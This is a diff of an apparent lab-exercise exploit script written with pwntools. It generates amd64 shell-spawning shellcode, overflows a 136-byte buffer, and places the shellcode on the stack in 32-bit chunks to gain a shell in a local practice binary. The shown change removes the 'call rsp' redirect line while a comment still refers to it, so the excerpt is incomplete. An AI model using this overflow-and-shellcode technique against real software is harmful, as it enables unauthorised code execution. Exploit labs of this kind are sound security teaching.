@@ -37,7 +37,7 @@ if __name__ == "__main__":
     # I start by preparing some shellcode.
     # I use the pwntools built-in shellcraft function to generate some for me.
     context.arch = "amd64"
-    shellcode = asm(shellcraft.amd64.linux.sh())
+    shellcode = shellcraft.amd64.linux.sh()
 
 
     # # To solve this challenge, I start by looking at the lab2-2.c file.
@@ -63,8 +63,12 @@ if __name__ == "__main__":
     # To overflow the buffer, I prepare to send 128+8 bytes.
     buffer_overflower = b"0"*136
 
-    # I also prepare to put the address of the "call rsp" instruction on the stack.
-    instruction_redirect = p64(call_rsp_address)
+    # Now, I'm ready to send in the shellcode. 
+    # As mentioned, I can only send in 32-bits at a time. 
+    # So, I have to break the code up. 
+    # See the function above for an explanation of how and why I chose to handle that problem.
+    machine_code = asm(shellcode)
+    put_shellcode_on_stack(machine_code, process_to_exploit)
 
     # Now I send the full attack to the process.
     # This causes the process to overflow the buffer, jump to "call rsp", and execute the shellcode.
